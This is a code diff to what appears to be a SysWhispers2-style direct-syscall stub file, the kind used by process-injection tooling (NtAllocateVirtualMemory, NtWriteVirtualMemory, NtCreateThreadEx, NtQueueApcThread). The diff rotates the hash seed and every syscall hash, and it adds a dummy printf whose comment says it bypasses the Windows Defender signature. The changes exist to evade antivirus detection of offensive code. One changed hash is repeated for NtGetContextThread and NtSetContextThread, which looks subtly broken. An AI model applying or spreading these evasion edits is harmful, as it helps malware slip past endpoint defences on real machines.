@@ -8,7 +8,7 @@
 
 #include <windows.h>
 
-#define SW2_SEED 0x14584512
+#define SW2_SEED 0x769B30B1
 #define SW2_ROL8(v) (v << 8 | v >> 24)
 #define SW2_ROR8(v) (v >> 8 | v << 24)
 #define SW2_ROX8(v) ((SW2_SEED % 2) ? SW2_ROL8(v) : SW2_ROR8(v))
@@ -208,6 +208,7 @@ DWORD SW2_HashSyscall(PCSTR FunctionName)
     while (FunctionName[i])
     {
         WORD PartialName = *(WORD*)((ULONG64)FunctionName + i++);
+        printf(""); // Bypass Windows Defender Signature
         Hash ^= PartialName + SW2_ROR8(Hash);
     }
 
@@ -320,7 +321,7 @@ __asm__("NewNtQueryInformationProcess: \n\
 	mov [rsp+24], r8\n\
 	mov [rsp+32], r9\n\
 	sub rsp, 0x28\n\
-	mov ecx, 0x00221FA6C\n\
+	mov ecx, 0x001B2E2DC\n\
 	call SW2_GetSyscallNumber\n\
 	add rsp, 0x28\n\
 	mov rcx, [rsp +8]\n\
@@ -339,7 +340,7 @@ __asm__("NtReadVirtualMemory: \n\
 	mov [rsp+24], r8\n\
 	mov [rsp+32], r9\n\
 	sub rsp, 0x28\n\
-	mov ecx, 0x08D97991B\n\
+	mov ecx, 0x07FDB0B37\n\
 	call SW2_GetSyscallNumber\n\
 	add rsp, 0x28\n\
 	mov rcx, [rsp +8]\n\
@@ -358,7 +359,7 @@ __asm__("NtProtectVirtualMemory: \n\
 	mov [rsp+24], r8\n\
 	mov [rsp+32], r9\n\
 	sub rsp, 0x28\n\
-	mov ecx, 0x00D9D031B\n\
+	mov ecx, 0x08D947B9B\n\
 	call SW2_GetSyscallNumber\n\
 	add rsp, 0x28\n\
 	mov rcx, [rsp +8]\n\
@@ -377,7 +378,7 @@ __asm__("NtWriteVirtualMemory: \n\
 	mov [rsp+24], r8\n\
 	mov [rsp+32], r9\n\
 	sub rsp, 0x28\n\
-	mov ecx, 0x08919C3DB\n\
+	mov ecx, 0x00A99647C\n\
 	call SW2_GetSyscallNumber\n\
 	add rsp, 0x28\n\
 	mov rcx, [rsp +8]\n\
@@ -396,7 +397,7 @@ __asm__("NtResumeThread: \n\
 	mov [rsp+24], r8\n\
 	mov [rsp+32], r9\n\
 	sub rsp, 0x28\n\
-	mov ecx, 0x02A886657\n\
+	mov ecx, 0x03C99221B\n\
 	call SW2_GetSyscallNumber\n\
 	add rsp, 0x28\n\
 	mov rcx, [rsp +8]\n\
@@ -415,7 +416,7 @@ __asm__("NewNtClose: \n\
 	mov [rsp+24], r8\n\
 	mov [rsp+32], r9\n\
 	sub rsp, 0x28\n\
-	mov ecx, 0x0069DF7F1\n\
+	mov ecx, 0x0F694C33D\n\
 	call SW2_GetSyscallNumber\n\
 	add rsp, 0x28\n\
 	mov rcx, [rsp +8]\n\
@@ -434,7 +435,7 @@ __asm__("NtOpenProcess: \n\
 	mov [rsp+24], r8\n\
 	mov [rsp+32], r9\n\
 	sub rsp, 0x28\n\
-	mov ecx, 0x08E509FD3\n\
+	mov ecx, 0x0673F46A2\n\
 	call SW2_GetSyscallNumber\n\
 	add rsp, 0x28\n\
 	mov rcx, [rsp +8]\n\
@@ -453,7 +454,7 @@ __asm__("NtAllocateVirtualMemory: \n\
 	mov [rsp+24], r8\n\
 	mov [rsp+32], r9\n\
 	sub rsp, 0x28\n\
-	mov ecx, 0x0039D3523\n\
+	mov ecx, 0x08104838F\n\
 	call SW2_GetSyscallNumber\n\
 	add rsp, 0x28\n\
 	mov rcx, [rsp +8]\n\
@@ -472,7 +473,7 @@ __asm__("NtCreateThreadEx: \n\
 	mov [rsp+24], r8\n\
 	mov [rsp+32], r9\n\
 	sub rsp, 0x28\n\
-	mov ecx, 0x05EA8BDD2\n\
+	mov ecx, 0x046BC3042\n\
 	call SW2_GetSyscallNumber\n\
 	add rsp, 0x28\n\
 	mov rcx, [rsp +8]\n\
@@ -491,7 +492,7 @@ __asm__("NewNtWaitForSingleObject: \n\
 	mov [rsp+24], r8\n\
 	mov [rsp+32], r9\n\
 	sub rsp, 0x28\n\
-	mov ecx, 0x048D4A6F9\n\
+	mov ecx, 0x0865BFEB7\n\
 	call SW2_GetSyscallNumber\n\
 	add rsp, 0x28\n\
 	mov rcx, [rsp +8]\n\
@@ -510,7 +511,7 @@ __asm__("NtQueueApcThread: \n\
 	mov [rsp+24], r8\n\
 	mov [rsp+32], r9\n\
 	sub rsp, 0x28\n\
-	mov ecx, 0x02E832821\n\
+	mov ecx, 0x03A0A24B8\n\
 	call SW2_GetSyscallNumber\n\
 	add rsp, 0x28\n\
 	mov rcx, [rsp +8]\n\
@@ -529,7 +530,7 @@ __asm__("NtAlertResumeThread: \n\
 	mov [rsp+24], r8\n\
 	mov [rsp+32], r9\n\
 	sub rsp, 0x28\n\
-	mov ecx, 0x00CAFCA8D\n\
+	mov ecx, 0x06CC86651\n\
 	call SW2_GetSyscallNumber\n\
 	add rsp, 0x28\n\
 	mov rcx, [rsp +8]\n\
@@ -548,7 +549,7 @@ __asm__("NtGetContextThread: \n\
 	mov [rsp+24], r8\n\
 	mov [rsp+32], r9\n\
 	sub rsp, 0x28\n\
-	mov ecx, 0x0FA5DA4E7\n\
+	mov ecx, 0x062CF3C75\n\
 	call SW2_GetSyscallNumber\n\
 	add rsp, 0x28\n\
 	mov rcx, [rsp +8]\n\
@@ -567,7 +568,7 @@ __asm__("NtSetContextThread: \n\
 	mov [rsp+24], r8\n\
 	mov [rsp+32], r9\n\
 	sub rsp, 0x28\n\
-	mov ecx, 0x0944F96E9\n\
+	mov ecx, 0x062CF3C75\n\
 	call SW2_GetSyscallNumber\n\
 	add rsp, 0x28\n\
 	mov rcx, [rsp +8]\n\
@@ -586,7 +587,7 @@ __asm__("NtDelayExecution: \n\
 	mov [rsp+24], r8\n\
 	mov [rsp+32], r9\n\
 	sub rsp, 0x28\n\
-	mov ecx, 0x058B57A21\n\
+	mov ecx, 0x0C6CE0C6A\n\
 	call SW2_GetSyscallNumber\n\
 	add rsp, 0x28\n\
 	mov rcx, [rsp +8]\n\
